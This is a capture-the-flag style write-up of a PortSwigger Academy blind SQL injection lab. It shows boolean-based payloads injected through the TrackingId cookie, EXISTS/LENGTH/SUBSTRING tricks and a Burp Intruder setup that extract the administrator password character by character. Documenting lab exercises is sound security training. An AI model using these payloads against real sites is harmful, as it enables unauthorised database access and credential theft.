---
slug: "ps-sqli-11"
title: "Blind SQL injection with conditional responses"
platform: "PortSwigger"
difficulty: "Medium"
category: ["Web","SQLi"]
date: "2025-12-16"
minutes: 8
visible: true
tldr: "administrator password — solved and documented end to end."
format: "html"
---

<p class="mono lab-crumb">PORTSWIGGER ACADEMY // SQLi SERIES &middot; LAB 11 &middot; <a href="https://github.com/0xWalid/Learnings/tree/main/Portswiggers/01-Sql%20Injection%20Labs/11-%20Blind%20SQL%20injection%20with%20conditional%20responses.md" target="_blank" rel="noopener">original notes &#8599;</a></p>
<p>Exploit a blind SQL injection vulnerability to extract the <strong>administrator password</strong> using <strong>conditional (boolean-based) responses</strong>, without seeing any SQL errors or query output.</p>
<h2>1. Initial Testing &amp; Vulnerability Identification</h2>
<h2>Parameters Tested</h2>
<ul><li><code>category</code></li><li><code>productId</code></li></ul>
<p>Both parameters were tested with a single quote (<code>'</code>) and <strong>no abnormal behavior</strong> was observed.</p>
<h2>Cookie-Based Testing</h2>
<p>While inspecting the HTTP request, a cookie parameter named <strong><code>TrackingId</code></strong> was identified.</p>
<h2>Observation</h2>
<ul><li>Normal <code>TrackingId</code> → Page displays <strong>"Welcome back!"</strong></li><li>Adding a single quote (<code>'</code>) → <strong>"Welcome back!" disappears</strong></li></ul>
<p>This behavior indicates:</p>
<ul><li>User input is being processed by the database</li><li>SQL errors are suppressed</li><li>The application logic depends on whether the SQL query evaluates to <strong>TRUE or FALSE</strong></li></ul>
<p>This confirms a <strong>blind SQL injection vulnerability with conditional responses</strong>.</p>
<h2>2. Understanding Why This Is Blind SQL Injection</h2>
<p>In this lab:</p>
<ul><li>No database errors are shown</li><li>No query results are reflected on the page</li><li>The only feedback channel is <strong>page behavior</strong></li></ul>
<p>This means:</p>
<ul><li>We cannot use <code>UNION SELECT</code> to retrieve data directly</li><li>We must rely on <strong>boolean logic</strong> (TRUE / FALSE conditions)</li></ul>
<p>The application likely executes a query similar to:</p>
<pre class="code" data-lang="sql"><code>SELECT trackingId FROM tracking
WHERE trackingId = '&lt;TrackingId&gt;';
</code></pre>
<p>If the query returns <strong>any rows</strong>, the application displays <strong>"Welcome back!"</strong>.</p>
<h2>3. Confirming Boolean Control</h2>
<h2>TRUE Condition</h2>
<pre class="code" data-lang="sql"><code>TrackingId=... ' AND '1'='1</code></pre>
<h2>FALSE Condition</h2>
<pre class="code" data-lang="sql"><code>TrackingId=... ' AND '1'='2</code></pre>
<h2>Result</h2>
<ul><li>TRUE → “Welcome back!” appears</li><li>FALSE → Message disappears</li></ul>
<p>This confirms full control over boolean logic in the SQL query.</p>
<h2>4. Why UNION Does Not Work Here</h2>
<h2>Failed Attempt (Example)</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
UNION SELECT username, password FROM users--</code></pre>
<p><strong>Why this fails:</strong></p>
<ul><li><code>UNION SELECT</code> only works when <strong>query results are reflected in the response</strong></li><li>This application does <strong>not display query output</strong></li><li>The page logic only checks whether rows exist</li><li>Therefore, UNION results are silently ignored</li></ul>
<p><strong>Lesson:</strong></p>
<p>If you do not see database output reflected, immediately switch to <strong>blind SQL injection techniques</strong>.</p>
<p><code>UNION</code> attacks are useful only when:</p>
<ul><li>Query results are <strong>reflected in the response</strong></li></ul>
<p>In this lab:</p>
<ul><li>The application never displays query output</li><li>It only checks whether rows exist</li></ul>
<p>Therefore:</p>
<ul><li><code>UNION SELECT</code> provides no benefit</li><li>Boolean-based payloads are required</li></ul>
<h2>5. Why Some Payloads Failed</h2>
<p>Understanding *why payloads fail* is just as important as knowing why others work.</p>
<h2>Failed Payload 1 — Invalid boolean context</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND SELECT username FROM users WHERE username='administrator'</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li><code>AND</code> requires a <strong>boolean expression</strong> (TRUE or FALSE)</li><li><code>SELECT username FROM users</code> returns rows, not a boolean</li><li>SQL cannot evaluate rows as a condition</li></ul>
<p><strong>Correct mindset:</strong></p>
<p>Every injected condition must resolve to <strong>TRUE or FALSE</strong>.</p>
<h2>Failed Payload 2 — Multiple-row subquery</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND (SELECT 'administrator' FROM users)='administrator'</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li>The subquery returns <strong>multiple rows</strong></li><li>SQL cannot compare multiple rows to a single value</li><li>This causes the condition to fail silently</li></ul>
<h2>Working Version of the Same Idea</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND (SELECT 'administrator' FROM users LIMIT 1)='administrator'</code></pre>
<p><strong>Why this works:</strong></p>
<ul><li><code>LIMIT 1</code> forces the subquery to return <strong>exactly one row</strong></li><li><code>'administrator' = 'administrator'</code> evaluates to TRUE</li></ul>
<p><strong>Lesson:</strong></p>
<p>Always constrain subqueries to <strong>a single row</strong> in blind SQL injection.</p>
<h2>Invalid Payload Example</h2>
<pre class="code" data-lang="sql"><code>AND SELECT username FROM users WHERE username='administrator'</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li><code>AND</code> expects a boolean expression</li><li><code>SELECT username FROM users</code> returns rows, not TRUE/FALSE</li><li>SQL syntax is invalid in this context</li></ul>
<h2>6. Why This Payload Worked</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND (SELECT 'administrator' FROM users LIMIT 1)='administrator'</code></pre>
<h2>Explanation</h2>
<ul><li>The subquery returns a <strong>constant value</strong></li><li><code>LIMIT 1</code> ensures exactly one row is returned</li><li><code>'administrator' = 'administrator'</code> evaluates to TRUE</li></ul>
<p>This confirms the <strong>existence</strong> of the <code>administrator</code> user.</p>
<h2>7. SQL Functions Used (Core Concepts)</h2>
<p>This lab relies on three core SQL functions. Below are <strong>working examples and failed examples</strong> for each so future confusion is avoided.</p>
<h2>1️⃣ <code>EXISTS</code></h2>
<h2>Working Example</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND EXISTS (SELECT 1 FROM users WHERE username='administrator')</code></pre>
<p><strong>Why it works:</strong></p>
<ul><li><code>EXISTS</code> returns TRUE if <strong>at least one row exists</strong></li><li>Perfect for presence checks in blind SQLi</li></ul>
<h2>2️⃣ <code>LENGTH()</code></h2>
<h2>Working Example</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND LENGTH((SELECT password FROM users WHERE username='administrator'))=20</code></pre>
<p><strong>Why it works:</strong></p>
<ul><li><code>LENGTH()</code> returns a numeric value</li><li>Numeric comparison evaluates cleanly to TRUE/FALSE</li></ul>
<h2>Failed Example</h2>
<pre class="code" data-lang="sql"><code>AND LENGTH(SELECT password FROM users)=20</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li><code>SELECT</code> must be wrapped in parentheses</li><li>SQL syntax is invalid otherwise</li></ul>
<h2>3️⃣ <code>SUBSTRING()</code></h2>
<h2>Working Example</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'</code></pre>
<p><strong>Why it works:</strong></p>
<ul><li>Extracts exactly <strong>one character</strong></li><li>Comparison resolves to TRUE or FALSE</li></ul>
<h2>Failed Example</h2>
<pre class="code" data-lang="sql"><code>AND SUBSTRING((SELECT password FROM users),1,1)='a'</code></pre>
<p><strong>Why it fails:</strong></p>
<ul><li>Subquery returns <strong>multiple rows</strong></li><li>Blind SQLi requires exactly one value</li></ul>
<p><strong>Key Rule:</strong></p>
<p>&gt; In blind SQL injection, every subquery must return one value, and every condition must evaluate to TRUE or FALSE. &gt;</p>
<h2>1️⃣ <code>EXISTS</code></h2>
<h2>Syntax</h2>
<pre class="code" data-lang="sql"><code>EXISTS (SELECT 1 FROM table WHERE condition)</code></pre>
<h2>Purpose</h2>
<ul><li>Returns TRUE if at least one row exists</li><li>Ideal for blind SQL injection</li></ul>
<h2>2️⃣ <code>LENGTH()</code></h2>
<h2>Syntax</h2>
<pre class="code" data-lang="sql"><code>LENGTH(string)</code></pre>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND LENGTH((SELECT password FROM users WHERE username='administrator'))='20'</code></pre>
<h2>Logic</h2>
<ul><li>Determines password length</li><li>Required before extracting characters</li></ul>
<h2>3️⃣ <code>SUBSTRING()</code></h2>
<h2>Syntax</h2>
<pre class="code" data-lang="sql"><code>SUBSTRING(string, position, length)</code></pre>
<h2>Example Payload</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'</code></pre>
<h2>Logic</h2>
<ul><li>Extracts one character at a time</li><li>Each request tests a TRUE/FALSE condition</li></ul>
<h2>8. Password Extraction with Burp Intruder</h2>
<h2>Payload Used</h2>
<pre class="code" data-lang="sql"><code>TrackingId=...'
AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),§1§,1)='§a§'</code></pre>
<h2>Intruder Configuration</h2>
<ul><li>§1§ → Numbers <code>1–20</code> (character position)</li><li>§a§ → Alphanumeric characters (<code>a–z</code>, <code>0–9</code>)</li><li>Attack type: <strong>Cluster Bomb</strong></li></ul>
<h2>Analysis Method</h2>
<ul><li>Sort responses by length</li><li>Identify responses containing <strong>"Welcome back!"</strong></li></ul>
<p>Each TRUE response reveals one correct character.</p>
<h2>9. Final Result</h2>
<pre class="code" data-lang="text"><code>Username: administrator
Password: j9emikunwxgnk0dm4upj</code></pre>
<ul><li>Logged in successfully</li><li>Application confirmed administrator access</li><li>Lab marked as solved</li><li>Screenshot:</li></ul>
<p>&lt;img width="1281" height="260" alt="image" src="https://github.com/user-attachments/assets/8be030ef-59b4-4065-8e2e-b108f9bae79d" /&gt;</p>
<h2>10. Future Testing Notes (Important)</h2>
<h2>When Testing SQL Injection:</h2>
<ul><li>Test <strong>all inputs</strong>:</li><li>URL parameters</li><li>POST data</li><li>Cookies</li><li>Headers</li><li>Decide attack type:</li><li>Output visible → UNION</li><li>No output → Blind SQLi</li><li>Blind SQLi workflow:</li><li>Prove boolean control</li><li>Confirm data existence</li><li>Find data length</li><li>Extract character-by-character</li><li>Automate early</li><li>Common mistakes to avoid:</li><li>Forgetting <code>LIMIT 1</code></li><li>Using UNION when output is not reflected</li><li>Skipping length detection</li><li>Not closing quotes properly</li></ul>
<h2>11. Notes for My Future Self</h2>
<ul><li>Blind SQLi is logic-based, not output-based</li><li>Always force subqueries to return one row</li><li>Boolean responses are powerful enough to extract full credentials</li><li>Automation is essential for reliability</li><li>If stuck, re-check assumptions about query structure</li></ul>

<details class="flag-box"><summary><span class="flag-label">LAB STATUS</span><span class="flag-hint"></span></summary><code>SQLi SERIES :: LAB 11 COMPLETE</code></details>
